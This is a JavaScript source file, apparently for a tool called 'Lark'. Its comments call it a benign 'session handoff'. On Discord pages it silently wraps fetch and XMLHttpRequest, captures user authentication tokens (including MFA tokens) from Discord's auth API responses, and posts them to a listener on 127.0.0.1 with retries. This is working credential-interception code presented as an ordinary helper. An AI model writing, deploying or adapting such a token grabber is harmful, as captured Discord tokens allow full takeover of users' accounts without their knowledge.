// Hands Discord's own auth response to a loopback listener.
// It does not read page storage, and it does not poll.
function installLarkSessionHandoff(env) {
  const box = env || {};
  const port = Number(box.port);
  const state = typeof box.state === "string" ? box.state : "";
  const endpoint = "http://127.0.0.1:" + String(port) + "/session";
  const delay = Number.isFinite(Number(box.retryMs)) ? Number(box.retryMs) : 400;
  const root = box.root || (typeof window !== "undefined" ? window : null);
  const post = typeof box.post === "function" ? box.post : defaultPost;
  let done = false;
  let inflight = false;

  function consider(url, body) {
    if (done) return Promise.resolve(false);
    if (!isDiscordAuthUrl(url)) return Promise.resolve(false);
    const token = tokenFromAuthJson(body);
    if (!token) return Promise.resolve(false);
    return deliver(token);
  }

  function deliver(token) {
    if (done || inflight) return Promise.resolve(false);
    inflight = true;
    const body = JSON.stringify({ state: state, token: token });
    function attempt(left) {
      return Promise.resolve()
        .then(function () {
          return post({ endpoint: endpoint, body: body });
        })
        .then(function (ok) {
          if (ok) {
            done = true;
            inflight = false;
            return true;
          }
          if (left > 1) return wait(delay).then(function () { return attempt(left - 1); });
          inflight = false;
          return false;
        })
        .catch(function () {
          if (left > 1) return wait(delay).then(function () { return attempt(left - 1); });
          inflight = false;
          return false;
        });
    }
    return attempt(3);
  }

  if (root && discordPage(box) && !(root.fetch && root.fetch.__larkSession)) {
    patchFetch(root, consider);
    patchXhr(root, consider);
  }

  return { consider: consider, endpoint: endpoint };
}

function discordPage(box) {
  const host = pageHost(box);
  return host === "discord.com" || host.endsWith(".discord.com") || host === "discordapp.com" || host.endsWith(".discordapp.com");
}

function pageHost(box) {
  if (box && typeof box.pageHost === "string") return box.pageHost.toLowerCase();
  try {
    return String(location.hostname || "").toLowerCase();
  } catch (err) {
    return "";
  }
}

function defaultPost(message) {
  return fetch(message.endpoint, {
    method: "POST",
    mode: "cors",
    credentials: "omit",
    headers: { "content-type": "text/plain" },
    body: message.body,
  }).then(function (response) {
    return !!(response && response.ok);
  });
}

function wait(ms) {
  return new Promise(function (resolve) {
    setTimeout(resolve, ms);
  });
}

function patchFetch(root, consider) {
  if (!root || typeof root.fetch !== "function") return;
  const native = root.fetch.bind(root);
  function wrapped(input, init) {
    const url = requestUrl(input);
    let pending;
    try {
      pending = init === undefined ? native(input) : native(input, init);
    } catch (err) {
      throw err;
    }
    if (!pending || typeof pending.then !== "function") return pending;
    return pending.then(function (response) {
      const finalUrl = (response && response.url) || url;
      if (isDiscordAuthUrl(finalUrl) || isDiscordAuthUrl(url)) {
        try {
          if (response && typeof response.clone === "function") {
            response.clone().text().then(function (body) {
              consider(isDiscordAuthUrl(finalUrl) ? finalUrl : url, body);
            }).catch(function () {});
          }
        } catch (err) {}
      }
      return response;
    });
  }
  wrapped.__larkSession = true;
  try {
    root.fetch = wrapped;
  } catch (err) {}
}

function patchXhr(root, consider) {
  const Original = root && root.XMLHttpRequest;
  if (typeof Original !== "function" || !Original.prototype || Original.prototype.__larkSessionOpen) return;
  const open = Original.prototype.open;
  const send = Original.prototype.send;
  if (typeof open !== "function" || typeof send !== "function") return;
  Original.prototype.open = function (method, url) {
    try {
      this.__larkAuthUrl = String(url || "");
    } catch (err) {
      this.__larkAuthUrl = "";
    }
    return open.apply(this, arguments);
  };
  Original.prototype.send = function () {
    try {
      this.addEventListener("load", function () {
        try {
          const url = this.__larkAuthUrl || "";
          if (!isDiscordAuthUrl(url)) return;
          const body = typeof this.responseText === "string" ? this.responseText : "";
          consider(url, body);
        } catch (err) {}
      });
    } catch (err) {}
    return send.apply(this, arguments);
  };
  Original.prototype.__larkSessionOpen = true;
}

function requestUrl(input) {
  if (typeof input === "string") return input;
  try {
    if (input && typeof input.url === "string") return input.url;
  } catch (err) {}
  return "";
}

function isDiscordAuthUrl(url) {
  const text = String(url || "");
  if (!text) return false;
  let path = "";
  try {
    const parsed = new URL(text, "https://discord.com");
    if (parsed.protocol !== "https:" && parsed.protocol !== "http:") return false;
    if (/^[a-z][a-z0-9+.-]*:/i.test(text) && !discordHost(parsed.hostname)) return false;
    path = parsed.pathname || "";
  } catch (err) {
    return false;
  }
  return path.indexOf("/api/") !== -1 && path.indexOf("/auth/") !== -1;
}

function discordHost(host) {
  const name = String(host || "").toLowerCase().replace(/\.$/, "");
  return name === "discord.com" || name.endsWith(".discord.com") || name === "discordapp.com" || name.endsWith(".discordapp.com");
}

function tokenFromAuthJson(body) {
  let text = String(body || "").replace(/^\uFEFF/, "").trim();
  if (!text) return "";
  let data = null;
  try {
    data = JSON.parse(text);
  } catch (err) {
    return "";
  }
  if (!data || typeof data !== "object") return "";
  const token = data.token;
  if (typeof token !== "string" || !looksLikeUserToken(token)) return "";
  return token;
}

function looksLikeUserToken(value) {
  if (typeof value !== "string") return false;
  const text = value.trim();
  if (text.length < 20 || text.length > 400) return false;
  if (!/^[A-Za-z0-9._-]+$/.test(text)) return false;
  if (text.indexOf("mfa.") === 0) return text.length >= 24 && text.indexOf(".", 4) === -1;
  const parts = text.split(".");
  return parts.length === 3 && parts.every(function (part) { return part.length >= 4; });
}
